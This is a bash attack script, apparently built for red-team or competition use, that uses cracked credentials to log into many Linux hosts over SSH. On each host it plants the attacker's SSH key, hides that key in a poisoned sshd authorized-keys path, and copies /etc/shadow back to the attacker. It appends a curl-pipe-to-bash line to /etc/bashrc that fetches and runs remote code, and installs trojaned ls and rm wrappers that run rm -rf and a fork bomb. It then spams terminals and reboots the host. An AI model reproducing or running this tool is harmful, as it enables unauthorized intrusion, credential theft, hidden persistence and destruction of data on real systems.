#!/bin/bash
#  .▄▄ ·  ▄ .▄ ▄▄▄· ▄ •▄ ▄▄▄ .
#  ▐█ ▀. ██▪▐█▐█ ▀█ █▌▄▌▪▀▄.▀·
#  ▄▀▀▀█▄██▀▐█▄█▀▀█ ▐▀▀▄·▐▀▀▪▄
#  ▐█▄▪▐███▌▐▀▐█ ▪▐▌▐█.█▌▐█▄▄▌
#   ▀▀▀▀ ▀▀▀ · ▀  ▀ ·▀  ▀ ▀▀▀
#       ▄▄▄·  ▐ ▄ ·▄▄▄▄
#      ▐█ ▀█ •█▌▐███▪ ██
#      ▄█▀▀█ ▐█▐▐▌▐█· ▐█▌
#      ▐█ ▪▐▌██▐█▌██. ██
#       ▀  ▀ ▀▀ █▪▀▀▀▀▀•
#  ▄▄▄▄·  ▄▄▄· ▄ •▄ ▄▄▄ .
#  ▐█ ▀█▪▐█ ▀█ █▌▄▌▪▀▄.▀·
#  ▐█▀▀█▄▄█▀▀█ ▐▀▀▄·▐▀▀▪▄
#  ██▄▪▐█▐█ ▪▐▌▐█.█▌▐█▄▄▌
#  ·▀▀▀▀  ▀  ▀ ·▀  ▀ ▀▀▀
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## detects OS
	## injects ssh keys and gently poisons auth file location
	## spreads some aids
#=======================================================================================
#=======================================================================================
	#
	#*************** NEED TO DO/ADD ***********************
	# fix the non-prompt return at the end. ("starting sshd ok" but just stays blank)
	# checks for existing changes before reapplying them
	# make rickroll "safer"
	# fix file checking
	# check for failed install attempt before adding to 'installed' list
	# setup aafire (aalib)
	# fix the "pseudo terminal is not stdin", or whatever it is
	# make the rickPath better
	# change the clear argument to work with apache2 too
	### add the rest of it to Debian/Ubuntu
	# fix the $? in the if statements, they wont work right
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
###### RUN function #######
###########################
function main(){		###
if [[ $1 == -* ]]; then	###
	pkill screen		### CLEARS SCREEN
	echo CLEARED		###
	exit 0				###
else					###
	neo					###
	meat				###
	bones				###
	infect "$@"			### INFECTING TARGETS
fi 						###
}						###
###########################
#------ error handling ----------
### If error, give up			#
#set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
###########################################################################################
######  ╔╗ ┌─┐┌┐┌┌─┐┌─┐  ##################################################################
######  ╠╩╗│ ││││├┤ └─┐  ##################################################################
######  ╚═╝└─┘┘└┘└─┘└─┘  ##################################################################
# Setting Defaults & Gathering Info #######################################################
###########################################################################################
function bones() {
#### Setting Defaults ############################
	crackedLogins="./crackedLogins"
	targetShadows="./shadows"
	sshKey="/root/.ssh/id_rsa"
	rickPath='./rickRoll/*'
	rickScript='./rickRoll/roll.sh'
	rickSourceIP="$(hostname -I | awk '{print $1}')"
	### setting rickRoll IP ###
		echo ""
		read -p "What are we setting the rickRoll IP to [$rickSourceIP]: " rickSourceIP
		: ${rickSourceIP:=$(hostname -I | awk '{print $1}')}
		command sed -i "s/^rick=.*/rick=\"$rickSourceIP\"/" $rickScript
	rickHost="$rickSourceIP:80"
		#rickHost="$(hostname -I | tr -d ' '):8000"
# stuff for making sure the http server is alive and ready
	CHECK_rickServer="$(netstat -tulnap | grep -q "80.*apache"; echo $?)"
		#CHECK_rickServer="$(netstat -tulnap | grep -q 8000.*python; echo $?)"
	CHECK_rickFilesNum=5
	function CHECK_rick(){
		CHECK_rickFiles="$(curl -s "$rickHost" | grep -o roll | wc -l)"
		echo "$CHECK_rickFiles"
	}
#### Gathering Info ############################
	### ssh key ###
		if [ ! -e $sshKey ]; then
			ssh-keygen -f $sshKey -t rsa -N ''
		fi
	### targetShadows dir ###
		if [ ! -e $targetShadows ];then
			mkdir -p $targetShadows
		fi
	### HTTP server ###
		rm /var/www/html/*
		command cp $rickPath /var/www/html/
		if [ $CHECK_rickServer == 0 ] && (( "$(CHECK_rick)" == $CHECK_rickFilesNum*2 )); then
			printf "\n[\e[0;32m OK \e[0;m] Apache appears to be ready"
		else
			printf "\n[\e[0;33m STARTING \e[0;m]	Apache"
			service apache2 start
		## checks if the server started successfully ##
			if [ $? == 0 ]; then
			#making sure the files are there
				if (( "$(CHECK_rick)" != $CHECK_rickFilesNum*2 )); then
					printf "\n\n\e[0;35m**************************************************************\e[m"
					printf "\n[\e[0;33m WARNING \e[0;m] Apache is running but it's missing rickRoll files"
					printf "\n\e[0;35m**************************************************************\e[m"
					sleep 3
				else
					printf "\n[\e[0;32m STARTED \e[0;m]	Apache"
				fi
			else
				printf "\n[\e[0;31m FAILED \e[0;m] Couldn't start Apache for some reason.\n\tHelpful Error Code: 6"
			fi
		fi
		echo ""
	#### SimpleHTTPServer Setup (fails when multiple connection attempts are made) ####
	#	if [ $CHECK_rickServer == 0 ] && (( "$(CHECK_rick)" == $CHECK_rickFilesNum*2 )); then
	#		printf "\n[\e[0;32m OK \e[0;m] SimpleHTTPServer appears to be ready"
	#	else
	#		printf "\n[\e[0;33m STARTING \e[0;m]	SimpleHTTPServer"
	#		screen -dmS rickServer /bin/bash -c "cd rickRoll; python3 -m http.server"
	#		sleep 0.25	# required so the server has time to start
	#	# checks if the server started successfully
	#		if [ $? == 0 ]; then
	#			#making sure the files are there
	#				if (( "$(CHECK_rick)" != $CHECK_rickFilesNum*2 )); then
	#					printf "\n\n\e[0;35m**************************************************************\e[m"
	#					printf "\n[\e[0;33m WARNING \e[0;m] SimpleHTTPServer is running but it's missing files"
	#					printf "\n\e[0;35m**************************************************************\e[m"
	#					sleep 3
	#				else
	#					printf "\n[\e[0;32m STARTED \e[0;m]	SimpleHTTPServer"
	#				fi
	#		else
	#			printf "\n[\e[0;31m FAILED \e[0;m] Couldn't start SimpleHTTPServer for some reason.\n\tHelpful Error Code: 6"
	#		fi
	#	fi
}


###########################################################################################
######  ╦┌┐┌┌─┐┌─┐┌─┐┌┬┐ ##################################################################
######  ║│││├┤ ├┤ │   │  ##################################################################
######  ╩┘└┘└  └─┘└─┘ ┴  ##################################################################
# Infecting target(s) #####################################################################
###########################################################################################
function infect(){
#### launch bay #############
function payload(){			#
	if [[ $1 != '' ]]; then	#
		razor "$@"			# SINGLE TARGET
	else					#
		shotgun				# EVERYONE
	fi 						#
}							#
#############################
#+++++++++++++++
# single target
#+++++++++++++++
	function razor(){
#### Assigning values ############################
	# login info
		target="$(echo $tango   | cut -d" " -f1 || $1)"
			: ${target:=$1}
		username="$(echo $tango | cut -d" " -f2 || $2)"
			: ${username:=$2}
		password="$(echo $tango | cut -d" " -f3 || $3)"
			: ${password:=$3}
	# ssh commands
		#do NOT add -n to this one
		sshLoginCommand="timeout 1.5 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
		sshKeydCommand="timeout 1.5 ssh -n $target"
	# ssh paths
		sshUserPath="/home/$username/.ssh"
		sshUserKey="$sshUserPath/authorized_keys"
		sshRootPath="/root/.ssh"
		sshRootKey="$sshRootPath/authorized_keys"
		sshPoisonPath="/root/.vim"
		sshPoisonKey="$sshPoisonPath/ssh"
	# ssh continue
		sshContinue=0

#### Inserting keys ############################
		osDetect=$(timeout 1.5 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
			if [[ $? == 0 ]]; then
				printf "\n[%s] Inserting ssh key and poisoning dirs with (\e[0;33m%s\e[m:\e[0;33m%s\e[m)" "$target" "$username" "$password"
			else
				printf "\nFAILED to connect to %s" "$target"
			fi
		# uncomment when rando errors start poppin'
		#printf "\nosDetect result= $osDetect\n"
			case $osDetect in
				CentOS)
						#inserting key
							if ! timeout 1.5 ssh -n -o StrictHostKeyChecking=no "$target"; then
								$sshLoginCommand "
												echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
												echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
																		 cat >> $sshUserKey
												echo $password | sudo -S chmod 600 $sshUserKey &> /dev/null
												echo $password | sudo -S cp $sshUserKey $sshRootKey &> /dev/null
												echo $password | sudo -S restorecon -r /root &> /dev/null
												"</root/.ssh/id_rsa.pub &> /dev/null
							# if sudo doesn't exist, sets up the key for normal user and lets you know.
								if [ $? != 0 ]; then
									sshContinue=1
									printf "\n\e[0;31mwomp womp.. no sudo. you get to do it manually.. yay!!\e[0m\n\t[$target:$username:$password]\n"
									$sshLoginCommand "
													mkdir -m700 -p $sshUserPath
													chmod 600 $sshUserKey &> /dev/null || install -m 600 /dev/null $sshUserKey
													cat >> $sshUserKey
													" </root/.ssh/id_rsa.pub &> ./failedSudos
									echo "Failed to use Sudo on [$target]" >> ./failedSudos
								fi
							fi
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							if [ $sshContinue == 0 ]; then
								printf "[$target] Poisoning sshd rules"
								$sshKeydCommand "
											mkdir $sshPoisonPath
											cp $sshRootKey /root/.ssh/.authorized_keys
											chattr +i /root/.ssh/.authorized_keys
											echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
											" &
							fi
						#yanking back the shadow file
							if [ $sshContinue == 0 ]; then
								printf "\n[$target] Yanking shadow file"
								$sshKeydCommand "
											cat /etc/shadow
											" &> $targetShadows/shadow-$target
							fi
						#let the bodies hit the floor
							if [ $sshContinue == 0 ]; then
								printf "\n[$target] Loosing the plague\n"
								$sshKeydCommand "
											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
											echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
											chmod +x $seedPathsLS $seedPathsRM
											chmod 777 $seedPathsLS $seedPathsRM
											touch /tmp/.trigger
											echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
											echo '$centDirtyRootPS1' >> /etc/bashrc
											echo 'curl -s -L $rickHost/roll.sh | bash' >> /etc/bashrc ;
											yum install epel-release -y && yum --disablerepo=epel -y update ca-certificates && yum install aalib -y
											touch hiThere_{0001..1000}
											for n in {1..100}; do
												echo "WOULD YOU LIKE TO PLAY A GAME???" | tee /dev/hvc* /dev/tty* /dev/pts/*
												sleep .15
											done &> /dev/null
											init 6
											" &
							fi
							;;
				Ubuntu)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
							if [ $? != 0 ]; then
								sshContinue=1
								printf "\n[\e[0;31m FAILED \e[0;m] Inserting SSH keys"
							fi
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							if [ $sshContinue == 0 ]; then
								printf "\nPoisoning sshd rules on [$target]\n"
								$sshKeydCommand "
											mkdir $sshPoisonPath
											cp $sshRootKey $sshPoisonKey
											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
											service sshd restart
											" &
							fi
						#payload
							if [ $sshContinue == 0 ]; then
								$sshKeydCommand "
											touch /tmp/.trigger
											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
											echo '${dirtyRM}' | tee $seedPathsRM > /dev/null
											chmod +x $seedPathsLS $seedPathsRM
											chmod 777 $seedPathsLS $seedPathsRM
											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
											at now +1 minute <<< 'init 6'
											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done
											" &
							fi
							;;
				Debian)
						#inserting key
							$sshLoginCommand "
											echo $password |
											sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &&
											cat |
											sudo tee -a $sshUserKey $sshRootKey
											" </root/.ssh/id_rsa.pub &> /dev/null
							if [ $? != 0 ]; then
								sshContinue=1
								printf "\n[\e[0;31m FAILED \e[0;m] Inserting SSH keys"
							fi
						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
							if [ $sshContinue == 0 ]; then
								printf "\nPoisoning sshd rules on [$target]\n"
								$sshKeydCommand "
											mkdir $sshPoisonPath
											cp $sshRootKey $sshPoisonKey
											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
											service sshd restart
											" &
							fi
							;;
					*)
							printf " UNKNOWN target. Doing nothing.\n"
							;;
			esac
	}
#+++++++++++++++
# into a crowd
#+++++++++++++++
	function shotgun(){
		#checking for crackedLogins
		if [ -s $crackedLogins ]; then
			#sending each set of logins to run through razor
			while read -r tango; do
				printf "\n################################\n"
				razor
			done <<< $(sort -u $crackedLogins | sed '/^$/d')
			printf "\n################################\n\n"
		else
			printf "\n\n[\e[0;33m MISSING \e[0;m] Didn't find [$crackedLogins], or it's empty, so you must be testing something\n\t\t..hopefully..\n"
		fi
	}
payload "$@"
}
###########################################################################################
######  ╔╦╗╔═╗╔═╗╔╦╗ ######################################################################
######  ║║║║╣ ╠═╣ ║  ######################################################################
######  ╩ ╩╚═╝╩ ╩ ╩  ######################################################################
# checking for, and installing, needed stuff ##############################################
###########################################################################################
function meat(){
	commands="sshpass net-tools apache2"
	installing=""
	updated=1
	scriptPath="$BASH_SOURCE"
#### Updating Repos ############################
		if [ $updated == 0 ]; then
			command apt update
		# so it knows not to check next time
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
		printf "\n[\e[0;32m OK \e[0;m] Repos Updated\n"
#### Software ############################
	# looking for missing apps
		for word in $commands; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} $word"
			fi
		done
	# installing missing apps
		if [ "$installing" != "" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------"
		fi
}
###########################################################################################
###### ╔╦╗┬┬─┐┌┬┐ #########################################################################
######  ║║│├┬┘ │  #########################################################################
###### ═╩╝┴┴└─ ┴  #########################################################################
# dirty stuff #############################################################################
###########################################################################################
centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
centPATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"
seedPathsLS="/usr/local/sbin/ls /usr/local/bin/ls"
seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"

### scripts #################################
	dirtyLS="$(cat <<-'EOF'
				#!/bin/bash
				#
				# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
				#
				triggerPath="/tmp/.trigger"
				# pulls in and builds argsLS for the real ls
				argsLS=""
				argsLSrm=""
				while [[ "$1" != "" ]]; do
					argsLS="$1 ${argsLS}"
					argsLSrm="$2 ${argsLSrm}"
					shift
				done
				# checks for the trigger file, if it exists it acts like normal
				if [ ! -e $triggerPath ]; then
			        if [[ $argsLS == '--color=auto ' ]]; then
			                printf "\n..is something supposed to happen now?\n"
			        else
			                /bin/rm -rf $argsLSrm
			                printf "\n\e[0;95m*poof*\e[m goes [${argsLSrm}]\n"
			                #could just as easily `shred` to be meaner
			        fi
				else
			        /bin/ls $argsLS
			        #hints at the issue
			        printf "\n\n----\n"
			        printf "argsLS= $argsLS\n"
				fi
				EOF
				)"
###########################################################
	dirtyRM="$(cat <<-'EOF'
				#!/bin/bash
				#
				# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
				#
				trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
				#####################
				function mainRM(){	#
					buildEmUp "$@"	#
					tripwire		#
				}					#
				#####################
				triggerPath="/tmp/.trigger"
				### defining, and sourcing, increment info ###
				function buildEmUp(){
					incrementPath="/tmp/.increment"
						# checking if increment file exists, making it if not
						if [ ! -e $incrementPath ]; then
							echo "increment=0" > $incrementPath
						fi
					source $incrementPath

					# pulls in and builds argsRM for the real rm
					argsRM=""
					while [[ "$1" != "" ]]; do
						argsRM="$1 ${argsRM}"
						shift
					done
				}
				#### checks for the trigger file, if its there it acts like normal ###
				function tripwire(){
					if [ ! -e $triggerPath ]; then
						rmCase
					else
						/bin/rm $argsRM
						#hints at the issue
						printf "\n\n----\n"
						printf "argsRM= $argsRM\n"
					fi
				}
				### determining what happens based on number of times used ###
				function rmCase(){
					case $increment in
						0)
								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
								echo "hard drives are big. no need to delete anything.."
								sleep 1
								;;
						1)
								clear
								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
								printf "rude."	 			; sleep 1.5
								printf "\nstop that.\n"		; sleep 1.5
								clear
								;;
						2)
								clear
								increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
								printf "Ok, Here.\n"	; sleep 2
								printf "LET"			; sleep 1.0	;	printf "."	;	sleep 1.0 ;	printf "."	 ;	sleep 1.0
								printf "ME"				; sleep 0.5	;	printf "."	;	sleep 0.5 ;	printf "."	 ;	sleep 0.5
								printf "HELP.\n"		; sleep 0.5
								timeout 5 aafire
								o(){ o|o& };o &> /dev/null
								;;
						*)
								clear
								printf "\nBewbs\n"
								;;
					esac
				}
				mainRM "$@"
				EOF
				)"
###########################################################################################
#are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is $(pwd)\n\n"
		exit 1
	fi
}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main "$@"
